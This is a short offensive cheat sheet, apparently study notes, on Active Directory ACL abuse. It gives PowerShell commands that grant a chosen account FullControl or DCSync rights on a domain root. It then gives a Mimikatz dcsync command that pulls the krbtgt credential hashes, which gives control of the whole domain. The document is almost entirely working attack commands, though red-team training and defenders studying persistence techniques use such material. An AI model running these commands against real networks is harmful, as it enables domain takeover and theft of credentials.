# ACLs - Rights Abuse

* more ACLs to be abused
* example, with DA privs, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync"

* add FullControl rights
```powershell
Add-ObjectAcl -TargetDistinguisedName 'DC=sub,DC=domain,DC=local' -PrincipalSamAccountName username -Rights All -Verbose
```

* using AD module and Set-ADACL
```powershell
Set-ADACL -DistinguishedName 'DC=sub,DC=domain,DC=local' -Principal username -Verbose
```

* add rights for DCSync
```powershell
Add-ObjectAcl -TargetDistinguisedName 'DC=sub,DC=domain,DC=local' -PrincipalSamAccountName username -Rights DCSync -Verbose
```

* using AD module and Set-ADACL
```powershell
Set-ADACL -DistinguishedName 'DC=sub,DC=domain,DC=local' -Principal username -GUIDRight DCSync -Verbose
```

* this should allow us to run DCSync as a user without domain privs
* execute DCSync
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

































